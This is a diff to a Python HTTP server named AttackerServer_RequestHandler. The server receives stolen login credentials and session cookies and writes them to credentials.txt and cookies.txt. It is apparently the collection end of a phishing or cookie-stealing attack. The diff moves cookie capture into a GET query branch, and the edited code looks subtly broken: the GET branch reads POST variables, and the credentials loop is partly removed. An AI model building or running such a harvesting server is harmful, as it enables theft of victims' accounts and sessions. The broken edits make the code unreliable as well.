@@ -4,7 +4,6 @@ from cgi import parse_header, parse_multipart
 import requests
 from bs4 import BeautifulSoup
  
-
 base_login_url = ""
 
 # HTTPRequestHandler class
@@ -59,6 +58,11 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
             self.end_headers()
             # Send HTML
             self.wfile.write(bytes(html.prettify(), "utf8"))
+        elif queries.get('cookie'):
+            cookie = queries.get('cookie')
+            with open("cookies.txt", "w+") as out_file:
+                for k,v in postvars.items():
+                    out_file.write(k.decode('UTF-8') + " : " + v[0].decode('UTF-8') + "; ")
         
         return
 
@@ -69,10 +73,6 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
         
         if "credentials" in self.path:            
             with open("credentials.txt", 'w+') as out_file:
-                for k,v in postvars.items():
-                    out_file.write(k.decode('UTF-8') + " : " + v[0].decode('UTF-8') + "; ")
-        elif "cookies" in self.path:
-            with open("cookies.txt", "w+") as out_file:
                 for k,v in postvars.items():
                     out_file.write(k.decode('UTF-8') + " : " + v[0].decode('UTF-8') + "; ")
 
